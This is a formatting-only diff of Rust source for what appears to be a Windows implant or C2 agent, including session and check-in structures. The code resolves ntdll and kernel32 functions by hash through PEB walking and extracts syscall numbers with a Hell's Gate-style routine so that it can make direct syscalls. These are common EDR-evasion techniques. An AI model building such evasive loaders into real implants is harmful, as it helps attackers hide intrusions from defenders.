@@ -6,16 +6,21 @@ pub mod ldr;
 extern crate alloc;
 
 use alloc::{string::String, vec::Vec};
-use core::ffi::c_void;
-use core::sync::atomic::{AtomicBool, Ordering};
-use core::{cell::UnsafeCell, ptr::null_mut};
+use core::{
+    cell::UnsafeCell,
+    ffi::c_void,
+    ptr::null_mut,
+    sync::atomic::{AtomicBool, Ordering},
+};
+
 use ldr::{ldr_function_addr, ldr_module_peb, nt_current_teb};
 use mod_hhtgates::get_syscall_number;
-use rs2_win32::kernel32::Kernel32;
+use rs2_win32::{
+    kernel32::Kernel32,
+    ntapi::NtDll,
+    ntdef::{KUserSharedData, TEB},
+};
 use spin::Mutex;
-
-use rs2_win32::ntapi::NtDll;
-use rs2_win32::ntdef::{KUserSharedData, TEB};
 
 /// Represents a session containing connection information.
 pub struct Session {
@@ -50,14 +55,10 @@ impl Session {
     }
 
     /// Set the generic pointer to data.
-    pub fn set_encryptor_ptr(&mut self, encryptor: *mut c_void) {
-        self.encryptor_ptr = encryptor;
-    }
+    pub fn set_encryptor_ptr(&mut self, encryptor: *mut c_void) { self.encryptor_ptr = encryptor; }
 
     /// Set the generic pointer to data.
-    pub fn set_protocol_ptr(&mut self, protocol: *mut c_void) {
-        self.protocol_ptr = protocol;
-    }
+    pub fn set_protocol_ptr(&mut self, protocol: *mut c_void) { self.protocol_ptr = protocol; }
 }
 
 /// Configuration settings for the instance.
@@ -119,9 +120,7 @@ impl Instance {
     }
 
     /// Set the generic pointer to data.
-    pub fn set_checkin_data(&mut self, data: *mut c_void) {
-        self.pcheckindata = data;
-    }
+    pub fn set_checkin_data(&mut self, data: *mut c_void) { self.pcheckindata = data; }
 }
 
 // Atomic flag to ensure initialization happens only once.
@@ -218,7 +217,7 @@ unsafe fn init_global_instance() {
 
         let mut instance = Instance::new();
 
-        instance.kdata = 0x7FFE0000 as *mut KUserSharedData;
+        instance.kdata = 0x7ffe0000 as *mut KUserSharedData;
         instance.teb = nt_current_teb();
 
         // Resolve Ntdll base address
@@ -240,13 +239,11 @@ unsafe fn init_global_instance() {
         instance.kernel32.read_file = core::mem::transmute(read_file_addr);
 
         // Resolve CreateProcessW
-        let create_process_w_addr =
-            ldr_function_addr(instance.kernel32.module_base, CREATE_PROCESS_W_H);
+        let create_process_w_addr = ldr_function_addr(instance.kernel32.module_base, CREATE_PROCESS_W_H);
         instance.kernel32.create_process_w = core::mem::transmute(create_process_w_addr);
 
         // Resolve GetConsoleWindow
-        let get_console_window_addr =
-            ldr_function_addr(instance.kernel32.module_base, GET_CONSOLE_WINDOW_H);
+        let get_console_window_addr = ldr_function_addr(instance.kernel32.module_base, GET_CONSOLE_WINDOW_H);
         instance.kernel32.get_console_window = core::mem::transmute(get_console_window_addr);
 
         // Resolve LdrLoadDll
@@ -258,20 +255,16 @@ unsafe fn init_global_instance() {
             instance.ntdll.module_base,
             RTL_CREATE_PROCESS_PARAMETERS_EX_H,
         );
-        instance.ntdll.rtl_create_process_parameters_ex =
-            core::mem::transmute(rtl_create_process_parameters_ex_addr);
+        instance.ntdll.rtl_create_process_parameters_ex = core::mem::transmute(rtl_create_process_parameters_ex_addr);
 
         // Resolve RtlGetFullPathName_U
-        let rtl_get_full_path_name_u_addr =
-            ldr_function_addr(instance.ntdll.module_base, RTL_GET_FULL_PATH_NAME_U_H);
-        instance.ntdll.rtl_get_full_path_name_u =
-            core::mem::transmute(rtl_get_full_path_name_u_addr);
+        let rtl_get_full_path_name_u_addr = ldr_function_addr(instance.ntdll.module_base, RTL_GET_FULL_PATH_NAME_U_H);
+        instance.ntdll.rtl_get_full_path_name_u = core::mem::transmute(rtl_get_full_path_name_u_addr);
 
         // Resolve RtlGetFullPathName_UstrEx
         let rtl_get_full_path_name_ustrex_addr =
             ldr_function_addr(instance.ntdll.module_base, RTL_GET_FULL_PATH_NAME_USTREX_H);
-        instance.ntdll.rtl_get_full_path_name_ustrex =
-            core::mem::transmute(rtl_get_full_path_name_ustrex_addr);
+        instance.ntdll.rtl_get_full_path_name_ustrex = core::mem::transmute(rtl_get_full_path_name_ustrex_addr);
 
         // Resolve RtlDosPathNameToNtPathName_U
         let rtl_dos_path_name_to_nt_path_name_u_addr = ldr_function_addr(
@@ -285,19 +278,16 @@ unsafe fn init_global_instance() {
         let rtl_create_heap_addr = ldr_function_addr(instance.ntdll.module_base, RTL_CREATE_HEAP_H);
         instance.ntdll.rtl_create_heap = core::mem::transmute(rtl_create_heap_addr);
         // Resolve RtlAllocateHeap
-        let rtl_allocate_heap_addr =
-            ldr_function_addr(instance.ntdll.module_base, RTL_ALLOCATE_HEAP_H);
+        let rtl_allocate_heap_addr = ldr_function_addr(instance.ntdll.module_base, RTL_ALLOCATE_HEAP_H);
         instance.ntdll.rtl_allocate_heap = core::mem::transmute(rtl_allocate_heap_addr);
         // Resolve RtlFreeHeap
         let rtl_free_heap_addr = ldr_function_addr(instance.ntdll.module_base, RTL_FREE_HEAP_H);
         instance.ntdll.rtl_free_heap = core::mem::transmute(rtl_free_heap_addr);
         // Resolve RtlReAllocateHeap
-        let rtl_reallocate_heap_addr =
-            ldr_function_addr(instance.ntdll.module_base, RTL_REALLOCATE_HEAP_H);
+        let rtl_reallocate_heap_addr = ldr_function_addr(instance.ntdll.module_base, RTL_REALLOCATE_HEAP_H);
         instance.ntdll.rtl_reallocate_heap = core::mem::transmute(rtl_reallocate_heap_addr);
         // Resolve RtlDestroyHeap
-        let rtl_destroy_heap_addr =
-            ldr_function_addr(instance.ntdll.module_base, RTL_DESTROY_HEAP_H);
+        let rtl_destroy_heap_addr = ldr_function_addr(instance.ntdll.module_base, RTL_DESTROY_HEAP_H);
         instance.ntdll.rtl_destroy_heap = core::mem::transmute(rtl_destroy_heap_addr);
 
         // NtAllocateVirtualMemory
@@ -325,16 +315,12 @@ unsafe fn init_global_instance() {
             get_syscall_number(instance.ntdll.nt_terminate_process.syscall.address);
 
         // NtClose
-        instance.ntdll.nt_close.syscall.address =
-            ldr_function_addr(instance.ntdll.module_base, NT_CLOSE_H);
-        instance.ntdll.nt_close.syscall.number =
-            get_syscall_number(instance.ntdll.nt_close.syscall.address);
+        instance.ntdll.nt_close.syscall.address = ldr_function_addr(instance.ntdll.module_base, NT_CLOSE_H);
+        instance.ntdll.nt_close.syscall.number = get_syscall_number(instance.ntdll.nt_close.syscall.address);
 
         // NtOpenKey
-        instance.ntdll.nt_open_key.syscall.address =
-            ldr_function_addr(instance.ntdll.module_base, NT_OPEN_KEY_H);
-        instance.ntdll.nt_open_key.syscall.number =
-            get_syscall_number(instance.ntdll.nt_open_key.syscall.address);
+        instance.ntdll.nt_open_key.syscall.address = ldr_function_addr(instance.ntdll.module_base, NT_OPEN_KEY_H);
+        instance.ntdll.nt_open_key.syscall.number = get_syscall_number(instance.ntdll.nt_open_key.syscall.address);
 
         // NtQueryValueKey
         instance.ntdll.nt_query_value_key.syscall.address =
@@ -403,16 +389,12 @@ unsafe fn init_global_instance() {
             get_syscall_number(instance.ntdll.nt_create_named_pipe_file.syscall.address);
 
         // NtOpenFile
-        instance.ntdll.nt_open_file.syscall.address =
-            ldr_function_addr(instance.ntdll.module_base, NT_OPEN_FILE_H);
-        instance.ntdll.nt_open_file.syscall.number =
-            get_syscall_number(instance.ntdll.nt_open_file.syscall.address);
+        instance.ntdll.nt_open_file.syscall.address = ldr_function_addr(instance.ntdll.module_base, NT_OPEN_FILE_H);
+        instance.ntdll.nt_open_file.syscall.number = get_syscall_number(instance.ntdll.nt_open_file.syscall.address);
 
         // NtReadFile
-        instance.ntdll.nt_read_file.syscall.address =
-            ldr_function_addr(instance.ntdll.module_base, NT_READ_FILE_H);
-        instance.ntdll.nt_read_file.syscall.number =
-            get_syscall_number(instance.ntdll.nt_read_file.syscall.address);
+        instance.ntdll.nt_read_file.syscall.address = ldr_function_addr(instance.ntdll.module_base, NT_READ_FILE_H);
+        instance.ntdll.nt_read_file.syscall.number = get_syscall_number(instance.ntdll.nt_read_file.syscall.address);
 
         // NtReadVirtualMemory
         instance.ntdll.nt_read_virtual_memory.syscall.address =
